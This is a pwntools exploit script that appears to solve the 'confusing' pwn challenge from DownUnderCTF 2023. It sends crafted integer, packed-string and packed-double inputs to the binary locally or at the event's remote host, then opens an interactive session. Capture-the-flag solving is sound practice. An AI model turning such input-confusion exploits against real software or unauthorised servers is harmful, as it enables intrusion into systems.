#!/usr/bin/python3

from pwn import *

exe = ELF('confusing', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+160
                b*main+176
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('2023.ductf.dev', 30024)
else:
        p = process(exe.path)

GDB()
# 18446744073602648000
# 3FF9E3779B9486E5
sla(b'd: ', str(18446744073602648000))
sla(b's: ',str(u32("FLAG")))
sla(b'f: ', p64(0x3ff9e3779b9486e5))
p.interactive()
